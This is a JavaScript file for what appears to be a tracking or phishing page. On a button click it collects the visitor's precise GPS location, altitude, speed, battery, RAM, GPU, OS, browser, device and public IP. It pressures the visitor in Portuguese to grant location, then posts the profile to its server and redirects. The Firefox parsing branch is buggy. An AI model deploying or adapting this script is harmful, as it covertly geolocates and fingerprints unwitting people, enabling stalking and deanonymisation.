const button = document.getElementById("btn-permission");

const getPosition = () => {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      const options = { enableHighAccuracy: true };
      navigator.geolocation.getCurrentPosition(successCB, errorCB, options);
    }

    function successCB(pos) {
      const latitude = pos.coords.latitude;
      const longitude = pos.coords.longitude;                                                                                                                                           const altitude = pos.coords.altitude;
      const speed = pos.coords.speed;
      resolve({latitude, longitude, altitude, speed});
    }

    function errorCB(e) {
      if (e.PERMISSION_DENIED) {
        alert("POR FAVOR, ATIVE A LOCALIZAÇÃO, ATUALIZE A PÁGINA E PERMITA A LOCALIZAÇÃO!");
      } else {
        reject(new Error("Erro ao obter a posição."));
      }
    }
  });
};

const getBattery = async () => {
  let level = await navigator.getBattery()
  return level.level * 100 + "%"
};

const getCpu = () => {
  const canvas = document.createElement('canvas');
  const gl = canvas.getContext('webgl');

  if (!gl) {
    return "not avaliable"
  } else {
    const extension = gl.getExtension('WEBGL_debug_renderer_info');
    if (extension) {
      const vendor = gl.getParameter(extension.UNMASKED_VENDOR_WEBGL);
      const renderer = gl.getParameter(extension.UNMASKED_RENDERER_WEBGL);
      return `${vendor} ${renderer}`
    }
  }
};

const getRam = () => {
  return navigator.deviceMemory;
};

function getUserAgentInfo() {
  const ua = navigator.userAgent;
  let os = "";
  let browser = "";
  let device = "";

  //get user OS
  os = ua.split(";")[1].trim()

  //get user device
  device = ua.split(";")[2].trim().split(" ")[0].replace(")", "");

  // get the name of the user's browser
  if (ua.indexOf("SamsungBrowser") !== -1) {
    browser = "SamsungBrowser/ " + ua.match(/SamsungBrowser\/(\d+)/)[1];
  } else if (ua.indexOf("Firefox") !== -1) {
    browser = "FireFox/ " + ua.indexOf(/Firefox\/(\d+)/)[1];
  } else if (ua.indexOf("Opera") !== -1) {
    browser = "Opera/ " + ua.match(/OPR\/(\d+)/)[1];
  } else if (ua.indexOf("Brave") !== -1) {
    browser = "Brave/ " + ua.match(/Brave\/(\d+)/)[1];
  } else if (ua.indexOf("Chrome") !== -1) {
    browser = "Chrome/ " + ua.match(/Chrome\/(\d+)/)[1];
  } else if (ua.indexOf("Safari") !== -1) {
    browser = "Safari/ " + ua.match(/Version\/(\d+)/)[1];
  }
  return {
    os,
    browser,
    device
  };
};

const getIp = async () => {
  const data = await $.ajax({
    url: 'https://api.ipify.org/',
    type: 'GET',
    contentType: 'application/json'
  });
  console.log(data)
  return data;
}

const sendData = async () => {
  const ip = await getIp();
  const battery = await getBattery();
  const location = await getPosition();
  const ram = getRam();
  const cpu = getCpu();
  const userAgent = getUserAgentInfo();

  const data = {
    ip,
    battery,
    location,
    ram,
    cpu,
    userAgent
  };

  if (location) {
    $.ajax({
      url: '/',
      type: 'POST',
      data: JSON.stringify(data),
      contentType: 'application/json',
      success: function(data) {
        window.location.href = data.url;
      }
    });
  }
};

button.addEventListener("click", sendData);
